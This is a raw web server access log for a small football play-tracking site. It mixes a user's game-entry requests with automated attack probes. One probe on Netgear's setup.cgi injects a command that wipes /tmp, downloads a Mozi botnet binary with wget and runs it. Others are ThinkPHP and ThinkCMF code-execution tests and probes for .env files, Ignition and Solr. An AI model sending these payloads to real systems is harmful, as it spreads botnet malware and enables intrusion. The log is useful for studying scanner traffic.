209.141.35.128 - - [11/Sep/2022:20:24:13 +0000] "GET /favicon.ico HTTP/1.1" 404 418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.112 - - [11/Sep/2022:20:24:18 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.112 - - [11/Sep/2022:20:24:18 +0000] "GET /favicon.ico HTTP/1.1" 404 418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
179.43.145.74 - - [11/Sep/2022:20:25:33 +0000] "GET / HTTP/1.1" 200 960 "-" "Linux Gnu (cow)"
80.94.92.239 - - [11/Sep/2022:20:32:15 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.220.81 - - [11/Sep/2022:20:45:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://172.104.25.168:80/admin/login.asp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0"
152.89.196.211 - - [11/Sep/2022:21:03:10 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
62.233.50.179 - - [11/Sep/2022:21:06:45 +0000] "\x03" 400 488 "-" "-"
175.100.60.229 - - [11/Sep/2022:21:19:21 +0000] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
80.94.92.231 - - [11/Sep/2022:21:21:08 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
152.89.196.211 - - [11/Sep/2022:21:33:25 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [11/Sep/2022:21:42:59 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 960 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.231 - - [11/Sep/2022:22:03:43 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
152.89.196.211 - - [11/Sep/2022:22:29:22 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 960 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
194.165.16.76 - - [11/Sep/2022:22:32:36 +0000] "\x03" 400 488 "-" "-"
194.165.16.76 - - [11/Sep/2022:22:32:37 +0000] "\x03" 400 488 "-" "-"
185.23.230.41 - - [11/Sep/2022:22:51:17 +0000] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
152.89.196.211 - - [11/Sep/2022:22:54:31 +0000] "GET /console/ HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.239 - - [11/Sep/2022:23:00:56 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [11/Sep/2022:23:01:43 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:23:14:46 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:23:14:48 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.95.147.39 - - [11/Sep/2022:23:15:57 +0000] "GET /a2billing/admin/Public/index.php HTTP/1.1" 400 488 "-" "libwww-perl/6.05"
27.43.207.4 - - [11/Sep/2022:23:20:32 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 382 "-" "-"
128.14.209.162 - - [11/Sep/2022:23:31:22 +0000] "GET /solr/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
152.89.196.211 - - [11/Sep/2022:23:41:19 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:05:56 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:06:02 +0000] "GET /static/css/Home.css HTTP/1.1" 200 1233 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:06:02 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:06:02 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 200 35260 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:06:02 +0000] "GET /static/images/HomeBackground.jpg HTTP/1.1" 200 1151446 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:06:02 +0000] "GET /static/images/HomeBackground_Iphone.jpg HTTP/1.1" 200 1127047 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:06:03 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1529 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:06:15 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:15 +0000] "GET /static/css/Home.css HTTP/1.1" 200 1233 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:15 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:16 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 200 35260 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:16 +0000] "GET /static/images/HomeBackground_Iphone.jpg HTTP/1.1" 200 1127048 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:18 +0000] "GET /Login HTTP/1.1" 200 898 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:18 +0000] "GET /static/css/Login.css HTTP/1.1" 200 1179 "http://172.104.25.168/Login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:18 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1528 "http://172.104.25.168/Login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:16 +0000] "GET /static/images/HomeBackground.jpg HTTP/1.1" 200 137240 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:24 +0000] "POST /LoginAttempt HTTP/1.1" 302 736 "http://172.104.25.168/Login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:24 +0000] "GET /Endzone/Hub HTTP/1.1" 200 887 "http://172.104.25.168/Login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:26 +0000] "GET /static/css/Hub.css HTTP/1.1" 200 704 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:26 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:26 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 275 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:51 +0000] "GET /Endzone/GameManagement HTTP/1.1" 200 3156 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:51 +0000] "GET /static/css/GameManagement.css HTTP/1.1" 200 1148 "http://172.104.25.168/Endzone/GameManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:51 +0000] "GET /static/css/Table.css HTTP/1.1" 200 1065 "http://172.104.25.168/Endzone/GameManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:51 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/Endzone/GameManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:06:52 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/GameManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:07 +0000] "POST /Endzone/Game HTTP/1.1" 200 5818 "http://172.104.25.168/Endzone/GameManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:07 +0000] "GET /static/css/Game.css HTTP/1.1" 200 1428 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:07 +0000] "GET /static/css/switch.css HTTP/1.1" 200 1157 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:07 +0000] "GET /static/css/SlimTable.css HTTP/1.1" 200 980 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:07 +0000] "GET /static/js/Game.js HTTP/1.1" 200 2064 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:07 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:07 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:08 +0000] "GET /static/spatial/EndzoneNorth.jpg HTTP/1.1" 200 85000 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:08 +0000] "GET /static/spatial/EndzoneSouth.jpg HTTP/1.1" 200 74896 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:08 +0000] "GET /endzone/rest/getformation HTTP/1.1" 200 429 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:08 +0000] "GET /endzone/rest/getdata?teamcode=EVHS22&team=Park&opponent=Eagan&year=2022&full=false HTTP/1.1" 200 197 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:08 +0000] "GET /static/spatial/Pressure.jpg HTTP/1.1" 200 48576 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:07:08 +0000] "GET /static/spatial/FootballFieldBase.jpg HTTP/1.1" 200 626582 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:09:12 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=1&quarter=1&drive=1&simplified=false&pright=0&pmiddle=0&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=0&distance=10&down=1&yard=17&lat=1.6640386950207486&lon=5.784695011772098&hash=Middle&r_lat=1.6969645836368998&r_lon=5.784695011772098&strength=Left&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=9&passzone=Middle%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:11:39 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=2&quarter=1&drive=1&simplified=false&pright=0&pmiddle=0&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=13&distance=10&down=2&yard=17&lat=1.6969645836368998&lon=5.784695011772098&hash=Middle&r_lat=2.972864211175162&r_lon=4.9933588460719935&strength=Left&playtype=Inside%20Run&playdir=Left&coverage=Zone%204&ballcarrier=23&passzone=Middle%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:13:45 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=3&quarter=1&drive=1&simplified=false&pright=0&pmiddle=0&pleft=0&pstunt=0&dformation=4-3&formation=Tray&result=0&distance=10&down=1&yard=30&lat=2.972864211175162&lon=4.9933588460719935&hash=Middle&r_lat=2.9536748710133267&r_lon=5.001603238930238&strength=Left&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%203&ballcarrier=9&passzone=Deep%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
90.151.171.106 - - [12/Sep/2022:00:15:26 +0000] "CONNECT api.ipify.org:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [12/Sep/2022:00:15:39 +0000] "GET http://api.ipify.org/?Z74643052982Q1 HTTP/1.1" 200 2578 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [12/Sep/2022:00:15:52 +0000] "-" 408 0 "-" "-"
75.72.177.151 - - [12/Sep/2022:00:16:18 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=4&quarter=1&drive=1&simplified=false&pright=0&pmiddle=0&pleft=0&pstunt=0&dformation=4-3&formation=Wide&result=1&distance=10&down=2&yard=30&lat=2.9536748710133267&lon=5.001603238930238&hash=Left&r_lat=3.05250665645244&r_lon=2.9057566053967814&strength=Right&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%203&ballcarrier=23&passzone=Flats%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:17:34 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=5&quarter=1&drive=1&simplified=false&pright=0&pmiddle=0&pleft=0&pstunt=0&dformation=3-4&formation=Trips&result=7&distance=9&down=3&yard=31&lat=3.05250665645244&lon=2.9057566053967814&hash=Left&r_lat=3.7598873508177957&r_lon=1.4223699702962023&strength=Right&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=9&passzone=Middle%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:18:37 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=6&quarter=1&drive=1&simplified=false&pright=0&pmiddle=0&pleft=0&pstunt=0&dformation=Goal%20Line&formation=Boa&result=8&distance=2&down=4&yard=38&lat=3.7598873508177957&lon=1.4223699702962023&hash=Middle&r_lat=4.57598324564312&r_lon=5.207466695816493&strength=Right&playtype=Inside%20Run&playdir=Right&coverage=Man%200&ballcarrier=23&passzone=Middle%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
152.89.196.211 - - [12/Sep/2022:00:19:05 +0000] "GET / HTTP/1.1" 200 960 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:20:24 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=7&quarter=1&drive=1&simplified=false&pright=0&pmiddle=0&pleft=0&pstunt=0&dformation=4-3&formation=Wide&result=-5&distance=10&down=1&yard=46&lat=4.57598324564312&lon=5.207466695816493&hash=Middle&r_lat=4.060980325820547&r_lon=5.048285753881295&strength=Right&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%203&ballcarrier=15&passzone=Non%20Passing%20Play HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:21:17 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=8&quarter=1&drive=1&simplified=false&pright=0&pmiddle=0&pleft=0&pstunt=0&dformation=4-3&formation=Storm&result=-1&distance=15&down=2&yard=41&lat=4.060980325820547&lon=5.048285753881295&hash=Middle&r_lat=3.9569253934515465&r_lon=4.976834349109668&strength=Left&playtype=Inside%20Run&playdir=Left&coverage=Zone%203&ballcarrier=23&passzone=Non%20Passing%20Play HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:22:35 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=9&quarter=1&drive=1&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=3-4&formation=Viper&result=2&distance=16&down=3&yard=40&lat=3.9569253934515465&lon=4.976834349109668&hash=Right&r_lat=4.187183866983177&r_lon=8.503537149654628&strength=Right&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=15&passzone=Non%20Passing%20Play HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:23:24 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:23:24 +0000] "GET /static/css/Home.css HTTP/1.1" 200 1233 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:23:24 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:23:24 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 200 35260 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:23:24 +0000] "GET /static/images/HomeBackground_Iphone.jpg HTTP/1.1" 200 1127047 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:23:24 +0000] "GET /static/images/HomeBackground.jpg HTTP/1.1" 200 1151446 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
75.72.177.151 - - [12/Sep/2022:00:23:24 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 419 "-" "MobileSafari/8613.3.9.0.16 CFNetwork/1335.0.3 Darwin/21.6.0"
75.72.177.151 - - [12/Sep/2022:00:23:24 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 418 "-" "MobileSafari/8613.3.9.0.16 CFNetwork/1335.0.3 Darwin/21.6.0"
75.72.177.151 - - [12/Sep/2022:00:23:25 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 418 "-" "MobileSafari/8613.3.9.0.16 CFNetwork/1335.0.3 Darwin/21.6.0"
75.72.177.151 - - [12/Sep/2022:00:23:25 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 418 "-" "MobileSafari/8613.3.9.0.16 CFNetwork/1335.0.3 Darwin/21.6.0"
75.72.177.151 - - [12/Sep/2022:00:23:25 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1528 "-" "MobileSafari/8613.3.9.0.16 CFNetwork/1335.0.3 Darwin/21.6.0"
75.72.177.151 - - [12/Sep/2022:00:24:42 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=10&quarter=1&drive=2&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=4-3&formation=Wide&result=2&distance=10&down=1&yard=15&lat=1.4552371551527568&lon=5.0873388838623255&hash=Middle&r_lat=1.6612214712792543&r_lon=5.177626120684883&strength=Left&playtype=Inside%20Run&playdir=Right&coverage=Zone%203&ballcarrier=23&passzone=Non%20Passing%20Play HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
